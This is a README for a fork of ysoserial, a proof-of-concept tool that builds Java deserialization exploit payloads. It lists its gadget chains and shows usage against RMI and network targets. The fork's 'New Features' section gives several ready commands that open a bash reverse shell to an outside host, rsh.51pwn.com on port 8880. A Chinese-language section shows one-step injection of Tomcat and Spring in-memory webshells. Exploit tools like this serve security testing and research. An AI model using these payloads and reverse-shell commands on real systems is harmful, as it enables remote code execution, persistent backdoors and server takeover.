
# ysoserial

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

# New Features
- add **CommonsCollections8**
```
java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections8 'https://rsh.51pwn.comExploit.class' 'exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1'
```
- add CommonsCollections5js support "js code",ByPass java8 "java.lang.Override missing element entrySet"
```
java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections5js "var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();"|nc 127.0.0.1 4712
```
- Allows java fragment code injection to be obtained from the environment variable **Custom_Code_51pwn** to solve complex command problems
eg:
```
export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
java -jar $mtx/../tools/ysoserial-all.jar CommonsBeanutils192NOCC "CLASS:ScriptEngineTemplate"
```
- Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
```
$ cat Custom_Code_51pwn
try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}

java -jar /Users/51pwn/Downloads/ysoserial-all.jar CommonsCollections2 'xx'>cc2
```
List :
- Click1
- CommonsBeanutils1
- CommonsCollections2
- CommonsCollections3
- CommonsCollections4
- Hibernate1
- JavassistWeld1
- JBossInterceptors1
- Jdk7u21
- JSON1
- MozillaRhino1
- MozillaRhino2
- ROME
- Spring1
- Spring2
- Vaadin1


## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections5js @51pwn                    commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## 内存马相关 thanks @Y4er

以CommonsBeanutils192NOCC为例：

```shell
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatCmdEcho"                     # TomcatCmdEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromJMX"      # TomcatServletMemShellFromJMX
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromJMX"       # TomcatFilterMemShellFromJMX     适用于tomcat7-9
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromJMX"     # TomcatListenerMemShellFromJMX
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerNeoRegFromThread"    # TomcatListenerNeoRegFromThread     python neoreg.py -k fuckyou
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       链接shell需要使用存在的路由
java -jar ysoserial.jar CommonsBeanutils192NOCC "FILE:E:\Calc.class"                      # ClassLoaderTemplate
java -jar ysoserial.jar CommonsBeanutils192NOCC "calc"                                    # CommandTemplate                 CLASS: FILE: 不使用协议开头则默认为执行cmd
```

一键注入cmdshell、冰蝎、哥斯拉内存马，shell连接使用请查看指定类。解决了request和response包装类导致冰蝎链接失败的问题，[见issue](https://github.com/rebeyond/Behinder/issues/187)。

以下受到`Gadgets.createTemplatesImpl`影响的gadget均需要如上方式传递参数：

1. Click1
2. CommonsBeanutils1
3. CommonsBeanutils183NOCC
4. CommonsBeanutils192NOCC
5. CommonsCollections2
6. CommonsCollections3
7. CommonsCollections4
8. Hibernate1
9. JavassistWeld1
10. JBossInterceptors1
11. Jdk7u21
12. JSON1
13. MozillaRhino1
14. MozillaRhino2
15. ROME
16. Spring1
17. Spring2
18. Vaadin1

## Installation

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
